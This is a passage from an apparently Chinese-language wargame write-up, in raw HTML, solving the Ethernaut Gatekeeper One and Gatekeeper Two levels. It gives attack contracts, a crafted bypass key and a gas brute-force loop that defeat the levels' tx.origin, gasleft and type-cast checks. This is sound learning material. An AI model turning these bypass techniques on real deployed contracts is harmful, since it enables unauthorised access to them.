comment\">//虚拟机中进行debug，传入gas为8191，观察执行完gas后所剩余gas，计算在此之前消耗的gas，在加上8191即为应传入gas</span>\n\n  <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateThree</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part one\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part two\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part three\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//绕过此部分的key构造在攻击合约中介绍</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">enter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> gateOne gateTwo <span class=\"token function\">gateThree</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    entrant <span class=\"token operator\">=</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"analyze\"><a href=\"#analyze\" class=\"headerlink\" title=\"analyze\"></a>analyze</h2><p>首先要了解类型转换机制，在虚拟机中部署一个测试合约，随意将一串字符转换成为bytes8格式</p>\n<p>并分别将其转变为uint64(result),uint32(uint64(result)),uint16(uint64(result))进行测试</p>\n<p>测试合约</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">test</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">bytes8</span> <span class=\"token keyword\">public</span> result<span class=\"token operator\">=</span><span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"abc\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">trans</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> b<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">trans1</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> a<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">trans3</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> c<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n       <span class=\"token keyword\">return</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">trans4</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">uint8</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>转换结果</strong></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281244028.png\"></p>\n<p>bytes8包括了16个字母加数字，bytes8与uint64所占字节数相同，通过转换以及在线进制转换可以知道uint64(result)相当于bytes8即后十六位,uint32(uint64(result))相当于byte4即后八位,uint16(uint64(result))相当于bytes2即后四位【以上都是后几位】</p>\n<p>所以构造用于绕过的key可以这样构造：①根据gatethree的第一个require可知key的后四位应该和后八位相等即0000xxxx②根据gatethree的第二个require可知key的后八位应该和后十六位(共十六位)不相等即前八位不全为0③根据gatethree的第三个require可知key的后八位应该和tx.origin的后四位相等。所以最终构造的key为:<font color=#FF0000>  <em>0x12345678000022ad</em> </font>  </p>\n<p>学习gasleft函数：这个比较好理解，就是执行完gas之后剩余的gas，可以再虚拟机中debug功能中计算，以下是操作过程</p>\n<p>先传入8191的gas限制</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281244964.png\"></p>\n<p>部署合约并传入刚才构造的key进行攻击，此时交易失败，复制 transaction hash进行debug，找到执行完gas后的dup2，可以看到即剩余的gas为7940，所以在此之前消耗的gas为8191-7940&#x3D;251，所以传入的gas应该为81910+251&#x3D;82161</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281244755.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281244405.png\"></p>\n<p>综上可以写出攻击合约</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    GatekeeperOne target<span class=\"token operator\">=</span><span class=\"token function\">GatekeeperOne</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x019F6D74cc988e55802adc44BD4130A3AC9C29a9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> key<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n         <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">&#123;</span>gas<span class=\"token punctuation\">:</span><span class=\"token number\">82161</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"enter(bytes8)\"</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n经过多次尝试后，均未通关，尝试更换编译器版本，结果发现每换一次版本，消耗的gas都不同<span class=\"token punctuation\">(</span>比如<span class=\"token number\">0.6</span><span class=\"token number\">.0</span>版本消耗的是<span class=\"token number\">251</span>，<span class=\"token number\">0.4</span><span class=\"token number\">.18</span>版本消耗的是<span class=\"token number\">242</span>，大概处在<span class=\"token number\">200</span><span class=\"token operator\">~</span><span class=\"token number\">300</span>的区间<span class=\"token punctuation\">)</span>，于是干脆换个写法，直接跑完<span class=\"token number\">200</span><span class=\"token operator\">~</span><span class=\"token number\">300</span>以内所有数字\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    GatekeeperOne target<span class=\"token operator\">=</span><span class=\"token function\">GatekeeperOne</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x0bE148c2fF43dD082Eac236aD6085262c176DF8A</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> key<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> i<span class=\"token operator\">=</span><span class=\"token number\">200</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;=</span><span class=\"token number\">300</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n         <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">&#123;</span>gas<span class=\"token punctuation\">:</span><span class=\"token number\">81910</span><span class=\"token operator\">+</span>i<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"enter(bytes8)\"</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n       <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>虚拟机中和链上消耗的gas不相同，需要使用区块链浏览器进行调试，攻击合约改为以下</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack1</span><span class=\"token punctuation\">&#123;</span>\n    GatekeeperOne target<span class=\"token operator\">=</span><span class=\"token function\">GatekeeperOne</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xc338d2a9C388AF974304eB36f7dE0CE39DeaC559</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> key<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n         <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"enter(bytes8)\"</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>在合约交互时，从metamask中设置gas limit<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>第一次gas limit设置为81910，得到如下结果</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281245391.png\"></p>\n<p><strong>第二次设置gas limit为81910-54095+81910&#x3D;109725，得到如下结果</strong></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281245922.png\"></p>\n<p><strong>第三次设置gas limit为81910-81475+109725&#x3D;110160,得到如下结果</strong></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281245522.png\"></p>\n<p><strong>第四次设置gas limit为81910-81903+110160&#x3D;110167，得到如下结果</strong></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281245550.png\"></p>\n<p><img src=\"https://storage.tttang.com/media/attachment/2022/04/08/c4f17e57-7dd3-47ec-a476-cf2163d578eb.png\"></p>\n<h1 id=\"14-Gatekeeper-Two\"><a href=\"#14-Gatekeeper-Two\" class=\"headerlink\" title=\"14.Gatekeeper Two\"></a>14.Gatekeeper Two</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.</p>\n<p>Things that might help:</p>\n<ul>\n<li>Remember what you’ve learned from getting past the first gatekeeper - the first gate is the same.</li>\n<li>The <code>assembly</code> keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See <a href=\"http://solidity.readthedocs.io/en/v0.4.23/assembly.html\">here</a> for more information. The <code>extcodesize</code> call in this gate will get the size of a contract’s code at a given address - you can learn more about how and when this is set in section 7 of the <a href=\"https://ethereum.github.io/yellowpaper/paper.pdf\">yellow paper</a>.</li>\n<li>The <code>^</code> character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see <a href=\"http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet\">here</a>). The Coin Flip level is also a good place to start when approaching this challenge.</li>\n</ul></blockquote>\n<h2 id=\"Code-13\"><a href=\"#Code-13\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">GatekeeperTwo</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> entrant<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">!=</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//使用合约调用就可以绕过</span>\n\n  <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateTwo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">uint</span> x<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span> x <span class=\"token operator\">:=</span> <span class=\"token function\">extcodesize</span><span class=\"token punctuation\">(</span><span class=\"token function\">caller</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateThree</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//把^当成次方算了半天一直失败，后来才了解到是异或运算(因为题目要求是英文，导致提示没看懂)</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">enter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> gateOne gateTwo <span class=\"token function\">gateThree</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    entrant <span class=\"token operator\">=</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-12\"><a href=\"#Analyze-12\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p><strong>运算符号学习</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Precedence</th>\n<th align=\"center\">Description</th>\n<th align=\"center\">Operator</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><em>1</em></td>\n<td align=\"center\">Postfix increment and decrement</td>\n<td align=\"center\"><code>++</code>, <code>--</code></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">New expression</td>\n<td align=\"center\">&#96;new <typename></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">Array subscripting</td>\n<td align=\"center\"><code>&lt;array&gt;[&lt;index&gt;]</code></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">Member access</td>\n<td align=\"center\"><code>&lt;object&gt;.&lt;member&gt;</code></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">Function-like call</td>\n<td align=\"center\"><code>&lt;func&gt;(&lt;args...&gt;)</code></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">Parentheses</td>\n<td align=\"center\"><code>(&lt;statement&gt;)</code></td>\n</tr>\n<tr>\n<td align=\"center\"><em>2</em></td>\n<td align=\"center\">Prefix increment and decrement</td>\n<td align=\"center\"><code>++</code>, <code>--</code></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">Unary plus and minus</td>\n<td align=\"center\"><code>+</code>, <code>-</code></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">Unary operations</td>\n<td align=\"center\"><code>delete</code></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">Logical NOT</td>\n<td align=\"center\"><code>!</code></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">Bitwise NOT</td>\n<td align=\"center\"><code>~</code></td>\n</tr>\n<tr>\n<td align=\"center\"><em>3</em></td>\n<td align=\"center\">Exponentiation</td>\n<td align=\"center\"><code>**</code></td>\n</tr>\n<tr>\n<td align=\"center\"><em>4</em></td>\n<td align=\"center\">Multiplication, division and modulo</td>\n<td align=\"center\"><code>*</code>, <code>/</code>, <code>%</code></td>\n</tr>\n<tr>\n<td align=\"center\"><em>5</em></td>\n<td align=\"center\">Addition and subtraction</td>\n<td align=\"center\"><code>+</code>, <code>-</code></td>\n</tr>\n<tr>\n<td align=\"center\"><em>6</em></td>\n<td align=\"center\">Bitwise shift operators</td>\n<td align=\"center\"><code>&lt;&lt;</code>, <code>&gt;&gt;</code></td>\n</tr>\n<tr>\n<td align=\"center\"><em>7</em></td>\n<td align=\"center\">Bitwise AND</td>\n<td align=\"center\"><code>&amp;</code></td>\n</tr>\n<tr>\n<td align=\"center\"><em>8</em></td>\n<td align=\"center\">Bitwise XOR</td>\n<td align=\"center\"><code>^</code></td>\n</tr>\n<tr>\n<td align=\"center\"><em>9</em></td>\n<td align=\"center\">Bitwise OR</td>\n<td align=\"center\">&#96;</td>\n</tr>\n<tr>\n<td align=\"center\"><em>10</em></td>\n<td align=\"center\">Inequality operators</td>\n<td align=\"center\"><code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code></td>\n</tr>\n<tr>\n<td align=\"center\"><em>11</em></td>\n<td align=\"center\">Equality operators</td>\n<td align=\"center\"><code>==</code>, <code>!=</code></td>\n</tr>\n<tr>\n<td align=\"center\"><em>12</em></td>\n<td align=\"center\">Logical AND</td>\n<td align=\"center\"><code>&amp;&amp;</code></td>\n</tr>\n<tr>\n<td align=\"center\"><em>13</em></td>\n<td align=\"center\">Logical OR</td>\n<td align=\"center\">&#96;</td>\n</tr>\n<tr>\n<td align=\"center\"><em>14</em></td>\n<td align=\"center\">Ternary operator</td>\n<td align=\"center\"><code>&lt;conditional&gt; ? &lt;if-true&gt; : &lt;if-false&gt;</code></td>\n</tr>\n<tr>\n<td align=\"center\"><em>15</em></td>\n<td align=\"center\">Assignment operators</td>\n<td align=\"center\"><code>=</code>, &#96;</td>\n</tr>\n<tr>\n<td align=\"center\"><em>16</em></td>\n<td align=\"center\">Comma operator</td>\n<td align=\"center\"><code>,</code></td>\n</tr>\n</tbody></table>\n<p><strong>assembly学习</strong></p>\n<table>\n<thead>\n<tr>\n<th>操作码</th>\n<th align=\"center\">标记</th>\n<th align=\"right\">解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>stop</td>\n<td align=\"center\">-</td>\n<td align=\"right\">停止执行，相当于返回（0,0)</td>\n</tr>\n<tr>\n<td>add(x,y)</td>\n<td align=\"center\"></td>\n<td align=\"right\">x + y</td>\n</tr>\n<tr>\n<td>sub(x,y)</td>\n<td align=\"center\"></td>\n<td align=\"right\">x - y</td>\n</tr>\n<tr>\n<td>mul(x,y)</td>\n<td align=\"center\"></td>\n<td align=\"right\">x * y</td>\n</tr>\n<tr>\n<td>div(x,y)</td>\n<td align=\"center\"></td>\n<td align=\"right\">x &#x2F; y</td>\n</tr>\n<tr>\n<td>sdiv(x,y)</td>\n<td align=\"center\"></td>\n<td align=\"right\">x &#x2F; y ,对于有符号数，用补码</td>\n</tr>\n<tr>\n<td>mod(x,y)</td>\n<td align=\"center\"></td>\n<td align=\"right\">x % y</td>\n</tr>\n<tr>\n<td>smod(x,y)</td>\n<td align=\"center\"></td>\n<td align=\"right\">x % y,对于有符号数，用补码</td>\n</tr>\n<tr>\n<td>exp(x,y)</td>\n<td align=\"center\"></td>\n<td align=\"right\">x的y次方</td>\n</tr>\n<tr>\n<td>not(x)</td>\n<td align=\"center\"></td>\n<td align=\"right\">～x，按位取反</td>\n</tr>\n<tr>\n<td>lt(x,y)</td>\n<td align=\"center\"></td>\n<td align=\"right\">如果x &lt; y,返回1，否则返回0</td>\n</tr>\n<tr>\n<td>gt(x,y)</td>\n<td align=\"center\"></td>\n<td align=\"right\">如果x &gt; y,返回1，否则返回0</td>\n</tr>\n<tr>\n<td>slt(x,y)</td>\n<td align=\"center\"></td>\n<td align=\"right\">如果x &lt; y,返回1，否则返回0,对于有符号数，用补码</td>\n</tr>\n<tr>\n<td>sgt(x,y)</td>\n<td 